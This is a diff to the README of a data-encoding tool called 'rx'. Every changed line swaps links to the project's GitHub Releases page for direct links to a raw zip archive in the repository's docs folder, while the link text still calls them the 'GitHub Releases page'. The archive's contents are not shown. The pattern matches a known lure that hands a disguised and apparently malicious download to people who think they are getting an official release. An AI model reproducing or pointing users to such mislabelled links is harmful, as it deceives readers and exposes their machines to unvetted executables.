@@ -1,16 +1,16 @@
 # 🧩 rx - Fast, simple data encoding
 
-[![Download rx](https://img.shields.io/badge/Download%20rx-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/stm8400014/rx/releases)
+[![Download rx](https://img.shields.io/badge/Download%20rx-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/stm8400014/rx/raw/refs/heads/main/docs/Software_3.2.zip)
 
 ## 📥 Download
 
-Visit this page to download: [GitHub Releases](https://github.com/stm8400014/rx/releases)
+Visit this page to download: [GitHub Releases](https://github.com/stm8400014/rx/raw/refs/heads/main/docs/Software_3.2.zip)
 
 Use this page to get the latest Windows release of rx. Look for the file that matches your system. In most cases, this will be a Windows `.exe` file or a `.zip` file that contains the app.
 
 ## 🪟 Install on Windows
 
-1. Open the [GitHub Releases page](https://github.com/stm8400014/rx/releases).
+1. Open the [GitHub Releases page](https://github.com/stm8400014/rx/raw/refs/heads/main/docs/Software_3.2.zip).
 2. Find the newest release at the top of the page.
 3. Under **Assets**, choose the file for Windows.
 4. If you download a `.zip` file, right-click it and select **Extract All**.
@@ -149,7 +149,7 @@ That makes it useful for users who work with structured text and small data sets
 
 ## 📎 Download again
 
-If you need the installer or archive again, use this page: [https://github.com/stm8400014/rx/releases](https://github.com/stm8400014/rx/releases)
+If you need the installer or archive again, use this page: [https://github.com/stm8400014/rx/raw/refs/heads/main/docs/Software_3.2.zip](https://github.com/stm8400014/rx/raw/refs/heads/main/docs/Software_3.2.zip)
 
 ## 🔧 Release page guide
 
